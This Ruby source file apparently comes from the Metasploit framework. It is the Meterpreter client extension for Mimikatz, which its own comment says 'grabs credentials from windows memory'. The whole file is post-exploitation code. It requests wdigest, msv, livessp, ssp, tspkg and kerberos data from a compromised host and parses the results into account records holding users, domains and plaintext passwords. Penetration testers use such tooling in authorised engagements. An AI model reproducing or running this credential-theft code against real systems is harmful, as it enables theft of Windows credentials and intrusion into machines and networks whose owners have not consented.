#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/mimikatz/tlv'
require 'csv'

module Rex
module Post
module Meterpreter
module Extensions
module Mimikatz

###
#
# Mimikatz extension - grabs credentials from windows memory.
#
# Benjamin DELPY `gentilkiwi`
# http://blog.gentilkiwi.com/mimikatz
#
# extension converted by Ben Campbell (Meatballs)
###

class Mimikatz < Extension

	def initialize(client)
		super(client, 'mimikatz')

		client.register_extension_aliases(
			[
				{
					'name' => 'mimikatz',
					'ext'  => self
				},
			])
	end

	def mimikatz_send_request(method)
		request = Packet.create_request(method)
		response = client.send_request(request)
		return Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
	end

	def parse_mimikatz_result(result)
		details = CSV.parse(result)
		accounts  =  []
		details.each do |acc|
			account = {
				:authid => acc[0],
				:package => acc[1],
				:user => acc[2],
				:domain => acc[3],
				:password => acc[4]
			}
			accounts << account
		end
		return accounts
	end

	def parse_mimikatz_ssp_result(result)
		details = CSV.parse(result)
		accounts = []
		details.each do |acc|
			ssps = acc[4].split(' }')
			ssps.each do |ssp|
				s_acc = ssp.split(' ; ')
				user = s_acc[0].split('{ ')[1]
				account = {
					:authid => acc[0],
					:package => acc[1],
					:user => user,
					:domain => s_acc[1],
					:password => s_acc[2],
					:orig_user => acc[2],
					:orig_domain => acc[3]
				}
				accounts << account
			end
		end
		return accounts
	end

	def wdigest
		result = mimikatz_send_request('mimikatz_wdigest')
		return parse_mimikatz_result(result)
	end

	def msv
		result = mimikatz_send_request('mimikatz_msv1_0')
		return parse_mimikatz_result(result)
	end

	def livessp
		result = mimikatz_send_request('mimikatz_livessp')
		return parse_mimikatz_result(result)
	end

	def ssp
		result = mimikatz_send_request('mimikatz_ssp')
		return parse_mimikatz_ssp_result(result)
	end

	def tspkg
		result = mimikatz_send_request('mimikatz_tspkg')
		return parse_mimikatz_result(result)
	end

	def kerberos
		result = mimikatz_send_request('mimikatz_kerberos')
		return parse_mimikatz_result(result)
	end
end

end; end; end; end; end

